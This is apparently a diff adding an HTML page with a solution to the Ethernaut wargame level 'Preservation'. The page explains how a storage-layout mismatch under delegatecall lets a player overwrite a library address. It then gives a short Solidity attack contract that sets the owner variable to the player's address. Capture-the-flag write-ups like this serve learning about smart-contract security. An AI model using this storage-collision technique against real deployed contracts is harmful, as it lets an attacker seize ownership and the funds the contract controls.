@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 16: Preservation</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 16: Preservation</h1>
+
+        
+      </div>
+      
+        
+        <p>The <code>LibraryContract</code> which the <code>Preservation</code> instance initially uses does not
+mirror <code>Preservation</code>‘s storage structure: The only storage variable in <code>LibraryContract</code>
+is <code>storedTime</code> in slot 0, which is occupied by <code>timeZone1Library</code> in <code>Preservation</code>.</p>
+<p>Because <code>Preservation</code> calls <code>LibraryContract.setTime</code> using <code>delegatecall</code>, this
+allows us to overwrite <code>timeZone1Library</code> with the attack contract’s address.</p>
+<p>The attack contract’s own <code>setTime</code> function is in turn called using <code>delegatecall</code>.
+Because it mirrors the caller’s storage structure correctly, it can simply set the
+<code>owner</code> variable to the desired value.</p>
+
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./16_Preservation.sol&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">PreservationAttack</span> </span>{
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> timeZone1Library;
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> timeZone2Library;
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
+    <span class="hljs-keyword">uint</span> storedTime;
+
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">constant</span> player = <span class="hljs-number">0xce45a59E18793C44018F15ECC84c1cDAebA69ad7</span>;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setTime</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _time</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        storedTime = _time;
+        owner = player;
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
